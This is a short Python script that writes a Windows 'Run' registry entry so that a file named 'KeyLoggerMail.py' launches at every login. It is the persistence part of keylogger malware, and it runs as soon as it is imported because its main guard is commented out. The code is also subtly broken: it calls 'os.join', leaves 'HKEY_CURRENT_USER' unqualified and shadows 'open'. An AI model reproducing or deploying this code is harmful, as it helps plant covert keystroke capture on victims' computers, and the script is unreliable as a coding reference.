import winreg as reg
import os			

def AddToRegistry():
	pth = os.path.dirname(os.path.realpath(__file__))
	s_name="KeyLoggerMail.py"	
	# s_name="required.exe"

	address=os.join(pth,s_name)

	key = HKEY_CURRENT_USER
	key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
	
	open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
	
	reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
	
	reg.CloseKey(open)


# if __name__=="__main__":
AddToRegistry()
